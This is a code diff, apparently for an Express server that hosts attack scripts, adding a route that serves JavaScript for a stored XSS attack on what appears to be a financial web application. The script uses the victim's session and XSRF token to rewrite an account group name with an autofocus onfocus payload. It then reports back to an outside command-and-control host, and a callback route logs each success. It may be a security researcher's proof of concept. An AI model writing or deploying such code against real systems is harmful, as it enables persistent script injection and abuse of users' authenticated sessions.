@@ -32,6 +32,53 @@ app.post("/testpay", (_req, res) => {
   res.type("html").send("<!doctype html><html lang=\"en\"><title>Test</title><body>hello</body></html>");
 });
 
+app.get("/stored-callback", (req, res) => {
+  if (req.query.event === 'planted') {
+    console.log("\n[+] STORED XSS PAYLOAD PLANTED IN GROUP " + req.query.group + "\n");
+  } else {
+    console.log("\n[+] STORED XSS TRIGGERED - CALLBACK SUCCESSFUL\n");
+  }
+  res.set("Access-Control-Allow-Origin", "*");
+  res.type("text/plain").send("stored xss triggered, callback successful");
+});
+
+app.get("/stored.js", (_req, res) => {
+  res.type("application/javascript").send(`
+var C2 = 'https://appsec-test-website.onrender.com';
+
+// Step 1: GET groups (rotates DI-XSRF-TOKEN)
+var g = new XMLHttpRequest();
+g.open('GET', '/sgw3/secureapp/N600/WebAPI/groups', false);
+g.withCredentials = true;
+g.send();
+var groups = JSON.parse(g.responseText);
+
+// Step 2: Read FRESH DI-XSRF-TOKEN (rotated by the GET above)
+var xsrf = decodeURIComponent(document.cookie.match(/DI-XSRF-TOKEN=([^;]+)/)[1]);
+
+if (groups && groups.length > 0) {
+  var groupId = groups[0].groupId;
+  var accounts = groups[0].accountNumbers;
+
+  // Step 3: Overwrite group name with stored XSS payload
+  // When Portfolio Performance renders this, onfocus fires automatically via autofocus
+  var payload = '" onfocus="fetch(\\'' + C2 + '/stored-callback\\')" autofocus="';
+
+  var x = new XMLHttpRequest();
+  x.open('POST', '/sgw3/secureapp/N600/WebAPI/groups/' + groupId + '/update', false);
+  x.withCredentials = true;
+  x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  x.setRequestHeader('X-Xsrf-Token', xsrf);
+  x.send('accountGroupingName=' + encodeURIComponent(payload) +
+         '&accountNumbers%5B%5D=' + accounts.join('&accountNumbers%5B%5D=') +
+         '&groupId=' + groupId);
+
+  // Confirm planting to C2
+  new Image().src = C2 + '/stored-callback?event=planted&group=' + groupId;
+}
+  `);
+});
+
 app.get("/accounts.js", (_req, res) => {
   res.type("application/javascript").send(`
   var C2 = 'https://appsec-test-website.onrender.com/testpay';
